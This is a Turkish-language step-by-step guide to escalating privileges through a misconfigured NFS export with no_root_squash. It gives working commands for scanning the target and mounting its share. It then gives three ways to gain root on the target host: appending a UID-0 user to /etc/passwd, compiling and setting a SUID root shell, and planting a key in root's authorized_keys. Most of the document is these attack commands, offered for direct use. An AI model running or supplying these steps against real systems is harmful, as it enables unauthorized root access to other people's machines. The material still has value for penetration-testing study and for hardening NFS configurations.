### Misconfigured NFS (Network File System) Yoluyla Privilege Escalation Rehberi

Misconfigured NFS, doğru şekilde yapılandırılmadığında bir sistem üzerinde **privilege escalation (hak yükseltme)** saldırısına yol açabilir. Bu rehberde, adım adım bir NFS zafiyetinden nasıl yararlanılacağını anlatacağım.

---

## 1. **NFS Nedir ve Zafiyetin Temeli?**

NFS, dosya paylaşımı için kullanılan bir protokoldür. Bir sistem, NFS aracılığıyla bir dizini diğer sistemlerle paylaşır. Yanlış yapılandırıldığında aşağıdaki riskleri oluşturabilir:

- **No_root_squash**: Uzak bir istemcinin **root** yetkileriyle işlem yapmasına izin verir.
- **Anon UID/GID Mapping**: Dosya izinlerinin istemcideki kullanıcı ve grup kimlikleriyle eşleşmesine izin verir.
- **Wildcards in Exports**: Yanlış wildcard kullanımı, beklenmeyen istemcilere erişim izni verebilir.

---

## 2. **Vulnerable NFS Mount Noktasının Keşfi**

### 2.1. **Nmap ile Açık Port Tarama**
```bash
nmap -sV -p 111 --script=nfs* <TARGET_IP>
```
Bu komut, hedefteki **NFS (RPC Bind)** servisini keşfetmenizi sağlar.

---

### 2.2. **Mount Noktalarını Listeleme**
NFS paylaşım noktalarını görmek için:
```bash
showmount -e <TARGET_IP>
```

#### Çıktı Örneği:
```plaintext
Export list for 192.168.1.100:
/shared *(rw,no_root_squash)
```

- **rw**: Okuma-yazma izni verilmiş.
- **no_root_squash**: Root yetkileri istemci tarafında korunur.
- `*`: Herkese açık paylaşım.

---

## 3. **NFS Paylaşımını Mount Etme**

Erişilebilir NFS paylaşımını kendi sisteminize mount edin:
```bash
sudo mount -t nfs <TARGET_IP>:/shared /mnt/nfs
```

Mount edilen dizine gidin ve içerikleri kontrol edin:
```bash
ls -la /mnt/nfs
```

---

## 4. **Hak Yükseltme Saldırısı**

### 4.1. **UID/GID Tabanlı Erişim (no_root_squash)**

Eğer paylaşım **no_root_squash** ile yapılandırılmışsa, uzaktaki root kullanıcısı, NFS paylaşımlı dizinlerde işlem yapabilir.

#### 4.1.1. **Root Yetkisiyle Dosya Yazma**
Kendi sisteminizde **UID=0** ve **GID=0** bir kullanıcı oluşturun:
```bash
sudo su
useradd -u 0 -g 0 attacker
su attacker
```

Şimdi NFS mount noktasında root yetkisiyle işlem yapabilirsiniz:
```bash
echo "attacker:x:0:0::/root:/bin/bash" >> /mnt/nfs/etc/passwd
```

Bu işlem, hedef sistemde bir `attacker` kullanıcısını root yetkileriyle oluşturur.

---

### 4.2. **SUID Dosyası Yaratma**
Bir **SUID binary** oluşturarak shell elde edebilirsiniz:
```bash
echo -e '#include <stdio.h>\n#include <stdlib.h>\nint main() { setuid(0); system("/bin/bash"); return 0; }' > /mnt/nfs/suid.c
gcc /mnt/nfs/suid.c -o /mnt/nfs/suid_shell
chmod +s /mnt/nfs/suid_shell
```

Hedef sistemde bu dosyayı çalıştırarak root yetkisi kazanabilirsiniz:
```bash
/mnt/nfs/suid_shell
```

---

### 4.3. **SSH Anahtarı Yerleştirme**
Eğer hedefte SSH root erişimi açıksa, root kullanıcısının `~/.ssh/authorized_keys` dosyasını değiştirebilirsiniz:
```bash
mkdir -p /mnt/nfs/root/.ssh
echo "YOUR_PUBLIC_SSH_KEY" > /mnt/nfs/root/.ssh/authorized_keys
```

Daha sonra, hedefe root kullanıcısı olarak SSH ile bağlanabilirsiniz:
```bash
ssh -i YOUR_PRIVATE_SSH_KEY root@<TARGET_IP>
```

---
